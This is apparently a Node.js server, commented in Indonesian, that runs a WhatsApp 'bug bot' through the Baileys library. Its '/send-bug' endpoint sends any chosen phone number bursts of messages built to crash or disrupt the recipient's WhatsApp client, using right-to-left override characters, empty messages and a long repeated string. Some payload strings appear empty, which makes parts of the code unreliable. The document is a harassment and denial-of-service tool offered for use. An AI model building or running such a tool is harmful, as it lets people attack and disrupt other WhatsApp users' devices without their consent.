const express = require('express');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

let bot = null;
let isConnected = false;

// Initialize WhatsApp Bot
async function initWhatsAppBot() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
        
        bot = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            logger: { level: 'silent' }
        });

        bot.ev.on('connection.update', (update) => {
            const { connection, qr } = update;
            
            if (qr) {
                console.log('📱 Scan QR Code di WhatsApp!');
            }

            if (connection === 'open') {
                isConnected = true;
                console.log('✅ WhatsApp Bot Connected!');
            }

            if (connection === 'close') {
                isConnected = false;
                console.log('❌ Connection closed');
                setTimeout(initWhatsAppBot, 5000);
            }
        });

        bot.ev.on('creds.update', saveCreds);
    } catch (error) {
        console.error('Bot init error:', error);
        setTimeout(initWhatsAppBot, 10000);
    }
}

// API Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/status', (req, res) => {
    res.json({ 
        status: 'online', 
        bot: isConnected ? 'connected' : 'disconnected',
        timestamp: new Date().toISOString()
    });
});

app.post('/send-bug', async (req, res) => {
    const { target, bugType } = req.body;
    
    if (!isConnected || !bot) {
        return res.json({ success: false, message: 'Bot belum terhubung' });
    }

    try {
        // Validasi target
        const formattedTarget = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
        
        console.log(`🐛 Mengirim ${bugType} ke ${formattedTarget}`);
        
        // Kirim bug messages
        await sendBugMessages(formattedTarget, bugType);
        
        res.json({ 
            success: true, 
            message: 'Bug berhasil dikirim',
            target: target
        });

    } catch (error) {
        console.error('Send bug error:', error);
        res.json({ 
            success: false, 
            message: error.message 
        });
    }
});

// Bug sending function
async function sendBugMessages(target, bugType) {
    const bugs = {
        v1: async () => {
            await bot.sendMessage(target, { text: "" });
            await new Promise(resolve => setTimeout(resolve, 100));
            await bot.sendMessage(target, { text: "" });
        },
        
        v2: async () => {
            const crashMsg = "‎‮‎‮‎‮‎‮‎‮‎‮‎‮";
            await bot.sendMessage(target, { text: crashMsg });
            await new Promise(resolve => setTimeout(resolve, 200));
            await bot.sendMessage(target, { text: crashMsg.repeat(2) });
        },
        
        v3: async () => {
            await bot.sendMessage(target, { text: "🚫 BUG_INITIATED" });
            await new Promise(resolve => setTimeout(resolve, 150));
            await bot.sendMessage(target, { text: "" });
            await new Promise(resolve => setTimeout(resolve, 150));
            await bot.sendMessage(target, { text: "‎‮‎‮‎‮‎‮‎‮‎‮‎‮" });
        },
        
        v4: async () => {
            const longText = "".repeat(500);
            await bot.sendMessage(target, { text: longText });
        }
    };

    if (bugs[bugType]) {
        await bugs[bugType]();
    } else {
        throw new Error('Bug type tidak dikenali');
    }
}

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Access: http://localhost:${PORT}`);
    initWhatsAppBot();
});
